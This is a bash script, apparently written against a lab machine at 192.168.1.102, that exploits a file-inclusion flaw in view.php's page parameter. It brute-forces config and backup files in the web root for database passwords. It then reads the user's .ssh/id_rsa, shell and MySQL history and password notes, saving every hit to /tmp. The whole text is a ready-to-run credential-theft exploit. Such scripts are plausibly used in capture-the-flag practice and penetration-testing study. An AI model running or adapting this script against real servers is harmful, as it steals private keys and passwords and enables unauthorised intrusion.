# Define target and base path variables
TARGET="192.168.1.102"
BASE_URL="http://"${TARGET}"/view.php?page=/var/www/html/"

HOME_BASE="http://"${TARGET}"/view.php?page=/home/zico/"

echo "[*] Scanning /var/www/html/ for backups..."
for ext in bak old swp txt log conf.dist sample; do
  # Check common config files with extensions
  for file in config database db settings connection include header footer index test debug temp phpinfo .htaccess wp-config; do
    URL="${BASE_URL}${file}.${ext}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    
    # If we get a 200, it's readable. Try to fetch content briefly to confirm it's not just an empty page or default error
    if [ "$STATUS" == "200" ]; then
      CONTENT=$(curl -s "$URL" | head -n 5)
      # Filter out pages that are likely just the web interface skeleton (checking for 'view.php' context usually helps, but here we look for non-empty meaningful content)
      if echo "$CONTENT" | grep -qE "(mysql|password|user|db_|define\(|<html.*>)"; then
        echo "[+] Found potential secret at: $URL"
        curl -s "$URL" > /tmp/zico_${file}_${ext}.txt 2>/dev/null # Save for review
      fi
    fi
  done
  
  # Also check if the extension itself exists on common filenames without a specific prefix guess (e.g., just looking for .bak files in root is hard, so we stick to known names)
done

echo ""
echo "[*] Scanning /home/zico/ for readable secrets..."
for file in .bash_history .ssh/id_rsa .mysql_history Desktop/passwords.txt Documents/notes.txt; do
  URL="${HOME_BASE}${file}"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
  
  if [ "$STATUS" == "200" ]; then
    echo "[+] Readable file found in home: $URL"
    curl -s "$URL" > /tmp/zico_home_${file}.txt 2>/dev/null
  fi
done

echo ""
echo "[*] Scan complete. Check /tmp/ for saved files."